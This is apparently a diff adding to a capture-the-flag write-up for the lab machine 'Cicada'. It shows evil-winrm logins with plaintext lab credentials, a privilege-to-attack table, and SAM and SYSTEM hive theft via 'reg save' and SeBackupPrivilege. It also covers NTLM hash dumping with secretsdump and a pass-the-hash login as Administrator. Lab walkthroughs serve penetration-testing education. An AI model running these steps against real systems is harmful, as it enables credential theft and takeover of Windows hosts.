@@ -152,3 +152,63 @@ smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
 - lets try to open it and we can see the pssword got converted into power shell string 
 - lets try to decrypt the string using the poweshell in kali,
 ![alt text](image-13.png)
+- It seems not working, lets try another method
+
+### Evil-WinRm
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+- Execute PowerShell commands.
+- Upload/download files.
+- Load in-memory PowerShell modules (like Mimikatz).
+- Requirements:
+WinRM must be enabled on the target.
+```bash
+evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb 
+```
+![alt text](image-14.png)
+- We've successfully gotten a WinRM session
+
+### Privilege Escalation
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+- Lets try some windows commands and see the permission
+```bash
+whoami /priv -  which will give you the Privilege Name  and its state (enables/disables)
+```
+- Some of the most important privilages 
+| Privilege Name | Description |
+|----------------|-------------|
+|SeImpersonatePrivilege|Potato attacks (JuicyPotato, PrintSpoofer) → SYSTEM access|
+|SeAssignPrimaryTokenPrivilege| Token manipulation attacks|
+|SeBackupPrivilege| Backup and restore files, folders, and registry keys(Read sensitive files (e.g., SAM, registry))|
+|SeRestorePrivilege| Restore files, folders, and registry keys (Write sensitive files (e.g., SAM, registry))|
+|SeDebugPrivilege|Inject into processes (Mimikatz, dumping LSASS)|
+|SeLoadDriverPrivilege|Load and unload device drivers(Load malicious kernel drivers)|
+|SeTakeOwnershipPrivilege|Take ownership of files, folders, and registry keys (Change permissions on sensitive files)|
+
+![alt text](image-15.png)
+
+
+- We can see SeBackupPrivilege - This privilege was designed to facilitate system backups and it enables access to system-protected files.
+- user having this permission can able to access the SYSTEM and SAM Windows Registry Hives, through which we can have the escalation.
+- Now lets try to copy the both sam and system registries to the current location using cmd 
+```bash
+reg save hklm\sam sam
+reg save hklm\system system
+download sam ----> which will downlode to kali
+download system----> 
+```
+### Impacket's secretsdump 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+- Now since we got the sam and system mail regestry as files.
+- Lets do the dumping process where the impackets will dump the user NTLM hashes.
+![alt text](image-16.png)
+```bash
+impacket-secretsdump -sam sam -system system local 
+```
+- Note:  local - Indicates that the files are stored locally (not a live system).
+![alt text](image-17.png)
+- We can use it to directly log in to the account with Evil-WinRM by passing it as a parameter with -H
+
+```bash
+evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb 
+```
+![alt text](image-18.png)
